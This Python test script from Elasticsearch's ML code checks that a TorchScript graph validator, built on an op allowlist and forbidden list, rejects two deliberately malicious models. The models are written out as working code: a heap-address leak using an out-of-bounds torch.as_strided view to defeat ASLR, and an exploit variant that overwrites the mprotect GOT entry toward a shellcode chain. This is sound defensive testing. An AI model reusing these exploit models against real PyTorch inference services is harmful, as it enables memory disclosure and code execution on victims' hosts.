#!/usr/bin/env python3
#
# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0 and the following additional limitation. Functionality enabled by the
# files subject to the Elastic License 2.0 may only be used in production when
# invoked by an Elasticsearch process with a license key installed that permits
# use of machine learning features. You may not use this file except in
# compliance with the Elastic License 2.0 and the foregoing additional
# limitation.
#
"""Pure-Python test that sandbox2 attack models are rejected by the graph validator.

This script mirrors the C++ CModelGraphValidator logic (allowlist, forbidden
list, recursive block traversal, graph inlining) in Python and runs it against
the evil TorchScript models from the sandbox2 security research (PR #2873).

It provides a fast feedback loop that does not require building the C++ binary
— useful during development of the allowlist or when adding new attack model
variants.  A pass here implies the C++ validator will also reject the models,
since the Python logic is a faithful port of CModelGraphValidator::validate()
and CSupportedOperations.

The evil models reproduce two real-world attack vectors against TorchScript:

  * HeapLeakModel  — uses torch.as_strided with an enormous storage offset
    to create an out-of-bounds view into the process heap, then scans for
    libtorch pointers to compute ASLR-defeating base addresses.

  * ExploitModel   — extends the heap-leak technique to overwrite a GOT
    entry (mprotect), mark a heap page as executable, and jump to embedded
    shellcode that writes arbitrary files to disk.

Both models are rejected because aten::as_strided, aten::item, and several
other operations they use are not in the transformer-architecture allowlist.

Usage:
    python3 test_graph_validation_evil_models.py

Requires: torch (no other dependencies)
Exit code: 0 if all tests pass, 1 otherwise.
"""

import sys
import tempfile
import shutil
from pathlib import Path

import torch
from torch import Tensor

# ---------------------------------------------------------------------------
# Reproduce the C++ allowlist / forbidden list from CSupportedOperations.cc
#
# These sets must be kept in sync with CSupportedOperations.cc.  If you add
# or remove an operation there, update the corresponding set here.
# ---------------------------------------------------------------------------

FORBIDDEN_OPERATIONS: set[str] = {
    "aten::from_file",
    "aten::save",
    "prim::CallFunction",
    "prim::CallMethod",
}

ALLOWED_OPERATIONS: set[str] = {
    # aten operations — covers the ops used by supported transformer
    # architectures (BERT, RoBERTa, DeBERTa, DistilBERT, XLM-R, MPNET,
    # E5, etc.)
    "aten::Int",
    "aten::IntImplicit",
    "aten::ScalarImplicit",
    "aten::__and__",
    "aten::abs",
    "aten::add",
    "aten::add_",
    "aten::arange",
    "aten::bitwise_not",
    "aten::cat",
    "aten::chunk",
    "aten::clamp",
    "aten::contiguous",
    "aten::cumsum",
    "aten::div",
    "aten::div_",
    "aten::dropout",
    "aten::embedding",
    "aten::expand",
    "aten::full_like",
    "aten::gather",
    "aten::ge",
    "aten::gelu",
    "aten::hash",
    "aten::index",
    "aten::index_put_",
    "aten::layer_norm",
    "aten::len",
    "aten::linear",
    "aten::log",
    "aten::lt",
    "aten::manual_seed",
    "aten::masked_fill",
    "aten::matmul",
    "aten::max",
    "aten::mean",
    "aten::min",
    "aten::mul",
    "aten::ne",
    "aten::neg",
    "aten::new_ones",
    "aten::ones",
    "aten::pad",
    "aten::permute",
    "aten::pow",
    "aten::rand",
    "aten::relu",
    "aten::repeat",
    "aten::reshape",
    "aten::rsub",
    "aten::scaled_dot_product_attention",
    "aten::select",
    "aten::size",
    "aten::slice",
    "aten::softmax",
    "aten::sqrt",
    "aten::squeeze",
    "aten::str",
    "aten::sub",
    "aten::tanh",
    "aten::tensor",
    "aten::to",
    "aten::transpose",
    "aten::type_as",
    "aten::unsqueeze",
    "aten::view",
    "aten::where",
    "aten::zeros",
    # prim operations — control flow, tuple/list manipulation, and type
    # queries that appear in every traced/scripted transformer model
    "prim::Constant",
    "prim::DictConstruct",
    "prim::GetAttr",
    "prim::If",
    "prim::ListConstruct",
    "prim::ListUnpack",
    "prim::Loop",
    "prim::NumToTensor",
    "prim::TupleConstruct",
    "prim::TupleUnpack",
    "prim::device",
    "prim::dtype",
    "prim::max",
    "prim::min",
}

MAX_NODE_COUNT = 1_000_000

# ---------------------------------------------------------------------------
# Python mirror of CModelGraphValidator
#
# The three functions below replicate the C++ validation logic:
#   collect_graph_ops  → CModelGraphValidator::collectBlockOps
#   collect_module_ops → CModelGraphValidator::collectModuleOps
#   validate_model     → CModelGraphValidator::validate
# ---------------------------------------------------------------------------


def collect_graph_ops(block) -> tuple[set[str], int]:
    """Recursively collect all op names from a TorchScript IR block.

    Mirrors CModelGraphValidator::collectBlockOps — walks every node in the
    block, records its kind (e.g. "aten::add"), and recurses into any nested
    blocks (inside prim::If / prim::Loop nodes).
    """
    ops: set[str] = set()
    node_count = 0
    for node in block.nodes():
        node_count += 1
        ops.add(node.kind())
        for sub_block in node.blocks():
            sub_ops, sub_count = collect_graph_ops(sub_block)
            ops.update(sub_ops)
            node_count += sub_count
    return ops, node_count


def collect_module_ops(module: torch.jit.ScriptModule) -> tuple[set[str], int]:
    """Collect all ops from a module's forward graph after inlining.

    Mirrors CModelGraphValidator::collectModuleOps.  Inlining resolves all
    prim::CallMethod nodes, so the single forward graph captures every
    operation across all submodules.
    """
    graph = module.forward.graph.copy()
    torch._C._jit_pass_inline(graph)
    return collect_graph_ops(graph)


def validate_model(module: torch.jit.ScriptModule) -> dict:
    """Validate a TorchScript module against the allowlist.

    Returns a dict with the same fields as CModelGraphValidator::SResult.
    """
    observed_ops, node_count = collect_module_ops(module)

    forbidden_found = sorted(op for op in observed_ops if op in FORBIDDEN_OPERATIONS)
    unrecognised_found = sorted(
        op for op in observed_ops
        if op not in FORBIDDEN_OPERATIONS and op not in ALLOWED_OPERATIONS
    )
    is_valid = not forbidden_found and not unrecognised_found and node_count <= MAX_NODE_COUNT

    return {
        "is_valid": is_valid,
        "forbidden_ops": forbidden_found,
        "unrecognised_ops": unrecognised_found,
        "node_count": node_count,
        "all_ops": sorted(observed_ops),
    }


# ---------------------------------------------------------------------------
# Attack model definitions
#
# These are adapted from the sandbox2 security research (PR #2873).  The
# models are intentionally malicious — they exploit implementation details
# of libtorch's memory layout to achieve arbitrary code execution.  They
# must NEVER be run outside of a sandboxed environment.
#
# SimpleBenignModel is a positive control that uses only allowlisted ops.
# ---------------------------------------------------------------------------


class SimpleBenignModel(torch.nn.Module):
    """Positive control — uses only allowlisted ops (aten::add, aten::unsqueeze)."""
    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        return (a + b + c + d).unsqueeze(0)


class LeakModel(torch.nn.Module):
    """Heap-address leak via torch.as_strided with a malicious storage offset.

    Attack vector: creates a strided view with storage_offset =
    2305843009213693952 (0x2000000000000000) minus the view length, causing
    the view to reference memory far outside the tensor's actual allocation.
    The model then scans this out-of-bounds memory for patterns that identify
    libtorch's internal data structures, leaking the base address of
    libtorch_cpu.so — defeating ASLR.

    The graph validator rejects this because aten::as_strided, aten::item,
    and aten::__rshift__ are not in the allowlist.
    """
    def find_heap_overlap(self, tensors: Tensor) -> tuple[list[int], Tensor]:
        evil_length = 0x900 * 8
        leak = torch.as_strided(tensors, [evil_length], [1], 2305843009213693952 - evil_length)
        index: list[int] = [-1]
        for i in range(evil_length - 1 - 5, -1, -1):
            if leak[i + 3].item() == leak[i + 5].item() and leak[i + 3].item() >> 40 == 127:
                if leak[i + 2].item() >= 0x100000000 and leak[i + 2].item() <= 0x100000005:
                    index.append(i)
        return (index, leak)

    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        tmp: list[Tensor] = []
        heap_len = 200
        array_len = 0x900
        for i in range(heap_len):
            tmp_values = [0xdead00000 + i] + [0xdead00000 + j for j in range(2, array_len)]
            tmp.append(torch.tensor(tmp_values))
        for i in range(heap_len):
            indexs, leak = self.find_heap_overlap(tmp[i])
            indexs = indexs[1:]
            if indexs == []:
                continue
            for index in indexs:
                heap_addr = leak[index + 3].item()
                libtorch_python_addr = leak[index + 1].item()
                libtorch_cpu_addr = libtorch_python_addr - 0xc878b50
                assert 1 == 0, "Input tensor must have at least one element: " + hex(libtorch_cpu_addr)
        for i in range(heap_len):
            print(tmp[i].shape)
        return torch.zeros(0)


class ExploitModel(torch.nn.Module):
    """ROP-chain exploit that attempts mprotect + shellcode for file writes.

    Attack vector: after leaking the libtorch base address (same technique
    as LeakModel), this model uses the out-of-bounds strided view to
    overwrite a function pointer in libtorch's GOT (Global Offset Table),
    redirecting the mprotect entry to a ROP gadget chain.  The chain:
      1. Calls mprotect to mark a heap page as read-write-execute.
      2. Jumps to embedded shellcode on that page.
      3. The shellcode opens and writes arbitrary files to disk.

    The graph validator rejects this because aten::as_strided, aten::item,
    aten::Delete and other operations are not in the allowlist.
    """
    def find_heap_overlap(self, tensors: Tensor) -> tuple[list[int], Tensor]:
        evil_length = 0x900 * 8
        leak = torch.as_strided(tensors, [evil_length], [1], 2305843009213693952 - evil_length)
        index: list[int] = [-1]
        for i in range(evil_length - 1 - 5, -1, -1):
            if leak[i + 3].item() == leak[i + 5].item() and leak[i + 3].item() >> 40 == 127:
                if leak[i + 2].item() >= 0x100000000 and leak[i + 2].item() <= 0x100000005:
                    index.append(i)
        return (index, leak)

    def get_address_data(self, leak: Tensor, index: int, tmp: list[Tensor], target_addr: int) -> int:
        leak[index] = target_addr
        return int(tmp[0].item())

    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        tmp: list[Tensor] = []
        heap_len = 200
        array_len = 0x900
        for i in range(heap_len):
            tmp_values = [0xdead00000 + i] + [0xdead00000 + j for j in range(2, array_len)]
            tmp.append(torch.tensor(tmp_values))
        for i in range(heap_len):
            indexs, leak = self.find_heap_overlap(tmp[i])
            indexs = indexs[1:]
            if indexs == []:
                continue
            for index in indexs:
                heap_addr = leak[index + 3].item()
                libtorch_python_addr = leak[index + 1].item()
                libtorch_cpu_addr = libtorch_python_addr - 0xc878b50
                leak[index + 3] = int(heap_addr - 0x8)
                for j in range(heap_len):
                    if tmp[j][2].item() == 0xDEAD00002 and i != j:
                        mprotect_got_addr = 0xc9785f0 + libtorch_cpu_addr
                        self.get_address_data(leak, index + 3, tmp[j : j + 1], int(mprotect_got_addr))
                        del tmp[j]
                        assert 1 == 0, "Input tensor must have at least one element: "
                        return torch.zeros(0)
        for i in range(heap_len):
            print(tmp[i].shape)
        return torch.zeros(0)


# ---------------------------------------------------------------------------
# Test runner
# ---------------------------------------------------------------------------

EVIL_MODELS = {
    "benign":  (SimpleBenignModel, "should PASS  — positive control using only allowed ops"),
    "leak":    (LeakModel,         "should FAIL — uses as_strided to leak heap addresses"),
    "exploit": (ExploitModel,      "should FAIL — uses as_strided + ROP chain for file write"),
}


def run_tests() -> bool:
    print("=" * 72)
    print("Graph-Validation Test Harness for Sandbox2 Attack Models (PR #2873)")
    print("=" * 72)
    print(f"Allowlist size : {len(ALLOWED_OPERATIONS)} operations")
    print(f"Forbidden list : {len(FORBIDDEN_OPERATIONS)} operations")
    print(f"Max node count : {MAX_NODE_COUNT:,}")
    print()

    tmp_dir = Path(tempfile.mkdtemp(prefix="graph_val_test_"))
    all_passed = True

    try:
        for name, (cls, description) in EVIL_MODELS.items():
            print(f"--- {name} model ({description}) ---")
            model_path = tmp_dir / f"model_{name}.pt"

            try:
                model = cls()
                scripted = torch.jit.script(model)
                torch.jit.save(scripted, str(model_path))
                print(f"  Generated: {model_path.name} ({model_path.stat().st_size} bytes)")
            except Exception as e:
                print(f"  SKIP: could not script {name} model: {e}")
                print()
                continue

            loaded = torch.jit.load(str(model_path))
            result = validate_model(loaded)

            print(f"  Node count      : {result['node_count']}")
            print(f"  Distinct ops    : {len(result['all_ops'])}")
            if result["forbidden_ops"]:
                print(f"  Forbidden ops   : {result['forbidden_ops']}")
            if result["unrecognised_ops"]:
                print(f"  Unrecognised ops: {result['unrecognised_ops']}")
            print(f"  Validator result: {'PASS (valid)' if result['is_valid'] else 'REJECTED (invalid)'}")

            expect_valid = (name == "benign")
            if result["is_valid"] == expect_valid:
                print(f"  Test: OK")
            else:
                expected = "PASS" if expect_valid else "REJECTED"
                print(f"  Test: FAIL — expected {expected}")
                all_passed = False

            print()

    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    print("=" * 72)
    if all_passed:
        print("ALL TESTS PASSED — every attack model is rejected by the graph validator.")
    else:
        print("SOME TESTS FAILED — see above for details.")
    print("=" * 72)

    return all_passed


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
